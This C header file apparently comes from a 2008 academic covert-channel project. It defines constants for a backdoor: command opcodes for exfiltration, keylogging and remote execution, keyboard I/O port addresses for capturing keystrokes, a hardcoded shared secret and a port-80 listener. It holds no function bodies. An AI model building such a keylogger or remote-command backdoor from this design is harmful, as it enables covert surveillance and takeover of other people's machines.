/*
 * Copyright (C) 2008 Stephen Makonin and Torin Sandall. All rights reserved. 
 */

#ifndef __COMMON_H__
#define __COMMON_H__

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <fcntl.h>
#include <errno.h>
#include <pcap.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <sys/io.h>
#include <sys/epoll.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>

/////////////////////////////////////////////////////////////////////
/// MISC DEFINITIONS
/////////////////////////////////////////////////////////////////////

#define _UNUSED __attribute__((unused))

/////////////////////////////////////////////////////////////////////
/// DATA TYPE REDEFINITIONS
/////////////////////////////////////////////////////////////////////

#define FALSE 0
#define TRUE !(FALSE)
#define SUCCESS 0
#define FAIL -1

/////////////////////////////////////////////////////////////////////
/// APPLICATION SIZE CONSTANTS
/////////////////////////////////////////////////////////////////////

#define BUFLEN 8096
#define SHARED_KEY_LEN 8
#define CMD_REQ_MIN_LEN 14
#define KEYLOG_SPAN 20
#define TABLE_SIZE 128
#define MAX_REQUEST_LEN 1500
#define MAX_PAYLOAD_LEN 96
#define MAX_COOKIE_LEN 129
#define MAX_FIELD_LEN 256
#define MAX_FILENAME_LEN 256

/////////////////////////////////////////////////////////////////////
/// APPLICATION VARIABLE VALUES
/////////////////////////////////////////////////////////////////////

#define CMD_REQ_OPCODE_EXFIL 0x10
#define CMD_REQ_OPCODE_KEYLOG 0x11
#define CMD_REQ_OPCODE_EXEC 0x12
#define KEYBOARD_DATA_PORT 0x60
#define KEYBOARD_STATUS_PORT 0x64
#define KEYSTROKE_DELAY_INTERVAL 1000
#define CLIENT_LISTENER_PORT 80
#define RAND_SLEEP_MOD 3
#define SECRET "COMP8505"

/////////////////////////////////////////////////////////////////////
/// APPLICATION CONFIGURATION DEFAULTS
/////////////////////////////////////////////////////////////////////

#define DEFAULT_TIMEOUT 5000

extern int verbose; // verbosity flag used throughout the application
extern int timeout; // timeout value used for epoll_wait
extern void dbg_print(const char *, ...);

#endif

